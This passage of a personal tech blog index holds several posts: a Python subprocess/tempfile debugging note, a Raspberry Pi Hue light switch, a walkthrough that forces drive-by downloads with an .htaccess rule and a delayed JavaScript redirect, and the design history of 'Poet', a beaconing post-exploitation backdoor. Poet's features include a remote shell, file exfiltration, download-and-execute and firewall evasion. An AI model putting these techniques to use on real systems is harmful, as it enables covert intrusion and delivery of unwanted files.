</span><span class='line'>                                    <span class="n">os</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
</span><span class='line'>                                    <span class="n">closed</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                            <span class="k">if</span> <span class="n">cwd</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">cwd</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                            <span class="k">if</span> <span class="n">preexec_fn</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">preexec_fn</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>                            <span class="c"># Close all other fds, if asked for - after</span>
</span><span class='line'>                            <span class="c"># preexec_fn(), which may open FDs.</span>
</span><span class='line'>                            <span class="k">if</span> <span class="n">close_fds</span><span class="p">:</span>
</span><span class='line'>                                <span class="bp">self</span><span class="o">.</span><span class="n">_close_fds</span><span class="p">(</span><span class="n">but</span><span class="o">=</span><span class="n">errpipe_write</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                            <span class="k">if</span> <span class="n">env</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">os</span><span class="o">.</span><span class="n">execvp</span><span class="p">(</span><span class="n">executable</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
</span><span class='line'>                            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">os</span><span class="o">.</span><span class="n">execvpe</span><span class="p">(</span><span class="n">executable</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                        <span class="k">except</span><span class="p">:</span>
</span><span class='line'>                            <span class="n">exc_type</span><span class="p">,</span> <span class="n">exc_value</span><span class="p">,</span> <span class="n">tb</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()</span>
</span><span class='line'>                            <span class="c"># Save the traceback and attach it to the exception object</span>
</span><span class='line'>                            <span class="n">exc_lines</span> <span class="o">=</span> <span class="n">traceback</span><span class="o">.</span><span class="n">format_exception</span><span class="p">(</span><span class="n">exc_type</span><span class="p">,</span>
</span><span class='line'>                                                                   <span class="n">exc_value</span><span class="p">,</span>
</span><span class='line'>                                                                   <span class="n">tb</span><span class="p">)</span>
</span><span class='line'>                            <span class="n">exc_value</span><span class="o">.</span><span class="n">child_traceback</span> <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">exc_lines</span><span class="p">)</span>
</span><span class='line'>                            <span class="n">os</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">errpipe_write</span><span class="p">,</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">exc_value</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>                        <span class="c"># This exitcode won&#39;t be reported to applications, so it</span>
</span><span class='line'>                        <span class="c"># really doesn&#39;t matter what we return.</span>
</span><span class='line'>                        <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                    <span class="c"># Parent</span>
</span><span class='line'>                    <span class="k">if</span> <span class="n">gc_was_enabled</span><span class="p">:</span>
</span><span class='line'>                        <span class="n">gc</span><span class="o">.</span><span class="n">enable</span><span class="p">()</span>
</span><span class='line'>                <span class="k">finally</span><span class="p">:</span>
</span><span class='line'>                    <span class="c"># be sure the FD is closed no matter what</span>
</span><span class='line'>                    <span class="n">os</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="n">errpipe_write</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                <span class="c"># Wait for exec to fail or succeed; possibly raising exception</span>
</span><span class='line'>                <span class="c"># Exception limited to 1M</span>
</span><span class='line'>                <span class="n">data</span> <span class="o">=</span> <span class="n">_eintr_retry_call</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">read</span><span class="p">,</span> <span class="n">errpipe_read</span><span class="p">,</span> <span class="mi">1048576</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>_execute_child()</code> function is called by the <code>subprocess.Popen</code> class
constructor and implements child process execution. There&rsquo;s a lot of
code here, but key parts to notice here are the <code>os.fork()</code> call which
creates the child process, and the relative lengths of the following
<code>if</code> blocks. The check <code>if self.pid == 0</code> contains the code for executing
the child process and is significantly more involved than the code
for handling the parent process.</p>

<p>From this, we can deduce that when the <code>subprocess.Popen()</code> call executes
in my code, after forking, while the child is preparing to call
<code>os.execve</code>, the parent simply returns, and immediately exits the <code>with</code>
block. This automatically invokes the <code>f.close()</code> function which deletes
the temp file. By the time the child calls <code>os.execve</code>, the file has been
deleted on disk. Oops.</p>

<p>I fixed this by adding the <code>delete=False</code> argument to the
<code>NamedTemporaryFile</code> constructor to suppress the auto-delete functionality.
Of course this means that the downloaded files will have to be cleaned up
manually, but this allows the client to not block when executing the file
and have the code still be pretty clean.</p>

<p>Main takeaway here: don&rsquo;t try to <code>Popen</code> a <code>NamedTemporaryFile</code> as the
last statement in the tempfile&rsquo;s <code>with</code> block.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/04/25/building-a-sketchy-website-101/">Building a Sketchy Website 101</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-04-25T17:42:10-04:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:42 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Back in April, I won a free &ldquo;.club&rdquo; domain through gandi.net&rsquo;s
<a href="https://15.gandi.net">anniversary</a> prize giveaway. I really didn&rsquo;t need
a &ldquo;.club&rdquo; domain in particular, so I thought it would be pretty fun to
register a stereotypical &ldquo;sketchy&rdquo; domain and set it up as a drive-by
download site or something, because while I&rsquo;ve <em>heard</em> of doing this kind of
thing, I&rsquo;ve never actually done it before. Here&rsquo;s a blog post walking through
what I did. The usual disclaimer applies here: I did this purely for my
own education and learning experience and am not responsible for anything
you do with it.</p>

<h3>Step 1: Register your sketchy domain</h3>

<p>I chose <a href="http://freemoviedownload.club">http://freemoviedownload.club</a>.</p>

<h3>Step 2: Set up drive-by downloads</h3>

<p>This involves configuring your web server to automatically set the
<code>Content-Type</code> header of the resource you want to force download
to <code>application/octet-stream</code>. That should make most web browsers trigger
a download file prompt to actually download the file. Safari curiously
doesn&rsquo;t support prompts for downloaded file location like Chrome and Firefox,
so in that case, it will immediately download the file to <code>~/Downloads</code>.</p>

<p>I&rsquo;m going to try to force a drive-by download of a jpg file, so I added
the below config to my <code>.htaccess</code> file in Apache&rsquo;s <code>DocumentRoot</code>.</p>

<figure class='code'><figcaption><span>.htaccess</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;Files</span> <span class="err">*.jpg</span><span class="nt">&gt;</span>
</span><span class='line'>        ForceType application/octet-stream
</span><span class='line'><span class="nt">&lt;/Files&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>That will force browers to download the image, rather than rendering it
when a browser tries to access <code>http://freemoviedownload.club/image.jpg</code>, for
example.</p>

<p>At this point, we&rsquo;re technically done. We can send someone a link to a file
and, assuming they say yes to the prompt (or use Safari), download it to their
computer.  But for some extra polish, I want to have an actual website with
content and have the download come from <em>that</em> page.</p>

<h3>Step 3: Redirect</h3>

<p>We can accomplish this with a trivial Javascript redirect that executes
after the page has loaded. We can even add a delay before the download happens
to give them time to read the website or whatever. The redirect will need
to be to the path configured in step 2, but this will give the illusion that
the download is coming from the <code>index.html</code> page.</p>

<figure class='code'><figcaption><span>index.html</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>you have arrived at the official free movie download club! enjoy your download
</span><span class='line'><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">charset=</span><span class="s">&quot;utf-8&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="kd">function</span> <span class="nx">f</span><span class="p">()</span> <span class="p">{</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;dickbutt.jpg&#39;</span> <span class="p">}</span>
</span><span class='line'>    <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">f</span><span class="p">,</span> <span class="mi">2000</span><span class="p">);</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s it! Anyone that browses to the website will automatically get a nice
&ldquo;dickbutt.jpg&rdquo; image downloaded to their machine. Again, particularly effective
against Safari and Chrome for Android, in my testing.</p>

<p><img src="/images/sketchy.gif" alt="" /></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/18/a-simple-iot-light-switch/">Building a Simple IoT Light Switch</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-18T13:32:48-05:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:32 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>I&rsquo;m lucky enough to own a <a href="http://www.meethue.com">Philips Hue</a> wireless
lighting unit (thanks <a href="http://acm.ccs.neu.edu">NUACM</a>!) which essentially is
this really awesome Internet of Things (IoT) product that lets me replace
all my standard light bulbs with special RGB ones that can be controlled
wirelessly. The bulbs communicate via
<a href="http://en.wikipedia.org/wiki/ZigBee">ZigBee</a> with a &ldquo;Bridge&rdquo; unit that
is connected to my local network and hosts an HTTP API for interfacing
with the lights. This API is used by the official Hue mobile app for controlling
the lights, but is also publicly documented and totally hacker friendly.
The lights are awesome, but it is a bit of a drag to have to use an app
to turn them all off rather than having some physical switch <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>, so I decided
to fully embrace the IoT trend and use my Raspberry Pi to build a simple
HTTP-fluent light switch for turning my lights on and off.</p>

<h3>Hardware</h3>

<p>The circuitry itself is literally as simple as it gets for this kind of thing,
all I have is GPIO pin 11 on the board (BCM pin 17) connected to pin 6 (GND),
with a switch in between. In my code, I&rsquo;ll configure pin 17 to use an internal
pull up resistor which will bring the voltage up to 3.3V when the button is not
pressed and down to 0V when it is.</p>

<p><img src="/images/rpi.jpg" alt="" /></p>

<h3>Software</h3>

<p>The Raspberry Pi Python library makes it really easy to control circuits. For
simplicity, my code uses a polling approach to detect when the button is pressed
but the RPi library also supports real callbacks using threading.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>        <span class="n">inp</span> <span class="o">=</span> <span class="n">gpio</span><span class="o">.</span><span class="n">input</span><span class="p">(</span><span class="n">PIN</span><span class="p">)</span>
</span><span class='line'>        <span class="c"># pull up resistor will cause inp to be True when button is not</span>
</span><span class='line'>        <span class="c"># pressed and False when button is pressed</span>
</span><span class='line'>        <span class="k">if</span> <span class="ow">not</span> <span class="n">inp</span><span class="p">:</span>
</span><span class='line'>            <span class="n">callback</span><span class="p">()</span>
</span><span class='line'>        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">BUTTON_SLEEP</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>My <code>callback()</code> function consists of code that uses the Hue API to request
a diagnostic of the lights, which comes back as a JSON blob with each light
represented as an object. If no lights are on, it turns them on, otherwise
turning them all off. Turning the lights on and off is as simple as submitting
a PUT request to the API endpoint for each light with a JSON blob specifying
the state to turn to (On=True, Off=False).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">callback</span><span class="p">():</span>
</span><span class='line'>    <span class="n">survey</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s">&#39;/lights&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">survey</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">survey</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span><span class='line'>    <span class="n">numlights</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">survey</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># if any are on, turn all off.</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">any</span><span class="p">([</span><span class="n">survey</span><span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)][</span><span class="s">&#39;state&#39;</span><span class="p">][</span><span class="s">&#39;on&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">numlights</span><span class="o">+</span><span class="mi">1</span><span class="p">)]):</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">light</span> <span class="ow">in</span> <span class="n">survey</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
</span><span class='line'>            <span class="n">turn</span><span class="p">(</span><span class="n">light</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;[{}] Off&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span>
</span><span class='line'>    <span class="k">else</span><span class="p">:</span>  <span class="c"># else if all are off, then all on</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">light</span> <span class="ow">in</span> <span class="n">survey</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
</span><span class='line'>            <span class="n">turn</span><span class="p">(</span><span class="n">light</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;[{}] On&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">turn</span><span class="p">(</span><span class="n">light</span><span class="p">,</span> <span class="n">state</span><span class="p">):</span>
</span><span class='line'>    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">&#39;on&#39;</span><span class="p">:</span><span class="n">state</span><span class="p">})</span>
</span><span class='line'>    <span class="n">requests</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s">&#39;/lights/{}/state&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">light</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s it! I leave the script running in a tmux pane on the Pi and I can
hit the button at any point to toggle the lights on and off. The full code
is available on <a href="https://github.com/mossberg/raspi/blob/master/hue.py">github</a>.</p>

<p>For future work,
it would be cool to integrate RF chips so the button wouldn&rsquo;t have to be
physically attached to the Pi and I could have a little remote control. I&rsquo;ll
leave that for another day. Thanks for reading, here it is in action!</p>

<blockquote class="instagram-media" data-instgrm-version="4" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:50% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAAGFBMVEUiIiI9PT0eHh4gIB4hIBkcHBwcHBwcHBydr+JQAAAACHRSTlMABA4YHyQsM5jtaMwAAADfSURBVDjL7ZVBEgMhCAQBAf//42xcNbpAqakcM0ftUmFAAIBE81IqBJdS3lS6zs3bIpB9WED3YYXFPmHRfT8sgyrCP1x8uEUxLMzNWElFOYCV6mHWWwMzdPEKHlhLw7NWJqkHc4uIZphavDzA2JPzUDsBZziNae2S6owH8xPmX8G7zzgKEOPUoYHvGz1TBCxMkd3kwNVbU0gKHkx+iZILf77IofhrY1nYFnB/lQPb79drWOyJVa/DAvg9B/rLB4cC+Nqgdz/TvBbBnr6GBReqn/nRmDgaQEej7WhonozjF+Y2I/fZou/qAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://instagram.com/p/yAhhmMn8yt/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_top">A video posted by Mark Mossberg (@mssbrg)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2015-01-18T20:09:40+00:00">Jan 18, 2015 at 12:09pm PST</time></p></div></blockquote>


<script async defer src="//platform.instagram.com/en_US/embeds.js"></script>



<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Of course I could physically go to each light and flip the switch but manually turning off all three lights in my room is even more work than launching the app.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/12/13/poet-beacon-based-post-exploitation/">Poet: Beacon Based Post-Exploitation</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-12-13T02:38:31-05:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>2:38 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h3>Introduction</h3>

<p>For the past eight months or so, I&rsquo;ve been working sporadically on a side
project of mine I call <a href="http://github.com/mossberg/poet">Poet</a>. Poet is
basically a tool for hackers that&rsquo;s useful for post exploitation, that is,
<em>after</em> you&rsquo;ve initially exploited and gotten access to the computer you&rsquo;re
not supposed to have access to. Poet is useful because it essentially acts as
a backdoor you can install into a system to help you maintain access once
you&rsquo;ve gotten your foot in the door.</p>

<p>As a disclaimer, I am building Poet purely for my own education and learning experience.
The code is freely available because I think it might be useful to others interested
in learning about this sort of thing. Use it responsibly.</p>

<p>I&rsquo;ve learned a lot during the process of
building this tool and I thought it would be cool to write a blog post (possibly
more to come)
documenting that process.</p>

<h3>Motivation</h3>

<p>The initial motivation for this project came from an experience I had
participating in the 2014 Northeast Collegiate Cyber Defense Competition. In
short, the competition requires a team of students to protect a small
business IT infrastructure from a red team of hackers. Usually the red team
is really good and completely owns you at some point or other throughout
the competition, and at the end they tell you what they did and give
you tips on how to improve. In particular, the red team told us that there
was pre-installed &ldquo;beaconing&rdquo; malware on many of our systems from the start
of the competition that would &ldquo;phone home&rdquo; to a command and control (C2) server
every once in a while to get commands and tasks to execute on the target
system. This idea was pretty interesting to me, and a basic implementation
didn&rsquo;t actually seem <em>too</em> hard to write, so I decided to give it a try, even
though at this point, I had no experience with network programming.</p>

<h3>v0.1</h3>

<p>The first version of Poet was drastically different from the current form
and was just about as simple and primitive as it gets for something
like this. In this version, the client program (executed on target) would
repeatedly attempt to connect to a socket (port 80 by default) on the server (attacker&rsquo;s C2 server)
at a specified interval. If the connection failed (server
wasn&rsquo;t running), the client would sleep, otherwise it would execute
a command sent from the server, sending back the stdout of the command.
The
server simply maintained a queue of commands to execute and would one
by one pop them off the queue and send them to the client, printing out the stdout
when it came back.
This was a great exercise
to learn the basics of socket programming, but of course
wasn&rsquo;t very useful at all, for a number of reasons. First, ideally the client&rsquo;s
interval is very large so as to minimize network use and
remain stealthy but that puts a hard limit on the rate at which
commands can be executed. This system was also very inflexible because there
was no way to reorder or edit commands in the queue, since the &ldquo;user
interface&rdquo; was just a server script that was run with the commands to execute
as arguments. Overall, a good start,
but there was definitely much work ahead to actually make this a semi-realistic tool.</p>

<h3>v0.2</h3>

<p>The second version of Poet involved a pretty substantial redesign although
one of the things to stay the same would be the high
level client/server beaconing dynamic. This is far superior than having the
client attempt to listen on the target&rsquo;s end because in any sort of &ldquo;real&rdquo;
scenario, the target will likely be behind a firewall that will reject
incoming packets on arbitrary ports.
The beaconing model will allow the tool
to bypass most standard firewalls that aren&rsquo;t specifically targeting it because
outbound port 80 traffic is almost certainly
allowed. I later changed the default port to 443 because it&rsquo;s just as
likely to be allowed out and because it could potentially avoid packet inspection,
since traffic on 443 is usually encrypted.</p>

<p>Building on top of this model, there were a couple other brainstorms I had
to build on top of v0.1. Instead of executing a single command for every ping,
what about sending over multiple commands? What about a pastebin/gist URL to
a script that the client
would download and execute? These would help solve the rate limit problem
because an arbitrary number of commands, instead of one, could be executed
for each ping. What about user interface?
What about creating an actual web user interface
for managing the command queue that the client was pulling from each ping?
This would help solve the flexibility problem.</p>

<p>While these would be relatively simple to add to v0.1,
if I asked myself, &ldquo;If I were a hacker, would I
want to use this tool?&rdquo; the answer would be &ldquo;No way!&rdquo; because I would only be able
to interact with my target system via discrete scripts, and I
would have to wait the ideally large time interval between pings to
get any sort of feedback on my actions.</p>

<p>This made it obvious that I would have to move
from a design where each ping from the client was an opportunity for the
user to run <em>x</em> actions on the target,
to a design where each ping from
the client was an opportunity for the user to interactively control the client
for an unlimited time,
and perform actions on the target with continuous feedback.
With this in mind, I opted to use a shell as the user interface on the server
side since it seemed simpler to implement and I was more familiar with
implementing a shell versus something like a web interface (which would
likely have to have a shell built into it anyway for executing commands).
The server design would be similar to that of v0.1 in that the server would
only be running when the user wanted to control the client, and the client
would use the inability to connect to the server as an sign to &ldquo;go to sleep&rdquo;
for another interval, although this isn&rsquo;t strictly necessary. Another server design
I thought of would be an always-on model where the server would always answer
the client&rsquo;s ping with some kind of binary state value, which would work equally
well, but wouldn&rsquo;t be strictly necessary because state can be inferred as
described above.</p>

<p>In designing the actual protocol the client
and server use to communicate, I decided to
use HTTP to mildly obfuscate the client&rsquo;s initial check if
the server is running. The client&rsquo;s ping consists of a
GET request for <code>/style.css</code> on the server <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. Of course, the server isn&rsquo;t
a real web server, but it temporarily masquerades as one for the purposes of
the initial handshake and sends back a hardcoded HTTP response of some random
css file, and launches the control shell for the user. At this point, the
protocol used is as simple as it gets: size of the following data + the data
itself. This being my first time doing socket programming, my implementation
was a little weird and reserved the first five bytes of the data sent over the
wire for the ASCII decimal representation of the size (<code>¯\_(ツ)_/¯</code>), but
hey, it worked.</p>

<p>The majority of the work left for v0.2 was essentially deciding on the features
that the control shell would have and implementing the &ldquo;userland utilities&rdquo;
or commands you could run at the shell. The commands I thought of and implemented
were:</p>

<ul>
<li><code>exec</code>: This was the first command I wrote. It executes one or more commands on
the target, sending the stdout of all of them back in one big chunk of text. I later
added a flag that would save the big chunk to a file in the archive directory.
Useful for stuff like grabbing process dumps.</li>
<li><code>recon</code>: Basically like <code>exec</code>, but the commands are pre-selected and are tailored
towards &ldquo;reconnaissance&rdquo; purposes. Stuff like <code>whoami</code>, <code>id</code>, <code>uname -a</code>, <code>w</code>, etc.</li>
<li><code>shell</code>: Launches an actual remote shell on the target (inside the original
control shell). Was implemented
really crudely in this version with the execution backend on the client simply
being something like</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><code>exfil</code>: Exfiltrate files and saves to the archive directory. Pretty standard.
Current implementation is pretty crude, and loads entire file into memory, rather
than paging the data somehow.</li>
<li><code>selfdestruct</code>: Exit the client and delete script on disk. Without this,
the user would have to do something weird (nay, treasonous?) like
killing the client&rsquo;s process from its own remote shell to completely
turn off the client.</li>
<li><code>dlexec</code>: Download an executable from the internet and execute it. Also
pretty standard, useful for upgrading or installing additional tools on target</li>
<li><code>exit</code>: Pretty self explanatory, this tells the client that the server&rsquo;s
done for now and that the client can now go back to sleep and begin pinging
again in one time interval.</li>
</ul>


<p>This work resulted in a decently functional prototype that could feasibly
be used for post-exploitation.</p>

<h3>v0.3</h3>

<p>Version 0.3 was a pretty arbitrary decision, but mostly involved significant
refactoring of the backend code, with a couple new user facing features.
One notable change was the refactoring of the entire codebase from imperative,
C-style programming to object oriented style, which gave the code much better
structure. The communications protocol was also slightly refactored to be
more standard by reserving the first four bytes for
the binary data size value which simultaneously conserved
bytes sent over the wire and increased the maximum data that could be sent in
one message between client and server. An additional shell command I implemented
was called <code>chint</code>, standing for &ldquo;change interval&rdquo;, which lets the server
change the client&rsquo;s ping delay interval after the client&rsquo;s been started.</p>

<p>All that&rsquo;s great, but the most significant set of improvements in my opinion
were related to fleshing out the remote shell feature. While it &ldquo;worked&rdquo;
to a decent degree for most standard commands there were two main problems with
it that kept it from being a &ldquo;real&rdquo; shell. For reference, here&rsquo;s what the code
looked like for executing commands in v0.2.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">cmd_exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">sp</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>For those that aren&rsquo;t as familiar with Python&rsquo;s <code>subprocess</code> library, this
executes an arbitrary command line (<code>cmd</code>), sending the stderr to the stdout,
and returns any stdout of the command.</p>

<p>The first problem was that the shell
output was not continuous &ndash; when executing a command like <code>ls -R /</code>, which
typically results in lots of scrolling output in a normal terminal, my remote
shell would instead block on the server end while the client executed the
command to its completion and sent over the entire stdout as one big piece.
I solved this problem by adapting the code to continuously poll the
stdout file descriptor for new lines of output, sending those over individually
so that the server would get each line of output as soon as it was available.</p>

<p>The second problem was that if certain commands like <code>ping</code> were executed in the shell,
the client would effectively become unusable because <code>ping</code> (when executed
without the <code>-c</code> parameter) is usually ended by being sent a INT signal (SIGINT),
typically by hitting Ctrl-C on the keyboard. The problem is, the client side
had no mechanism to receive signals and send them to the running process, so
it would be eternally running this unending process and the user
would totally lose control of the target. To solve this problem, I needed a way for the
client to simultaneously execute the requested command, <strong>and</strong> listen for
messages from the server, presumably telling the client to end the running
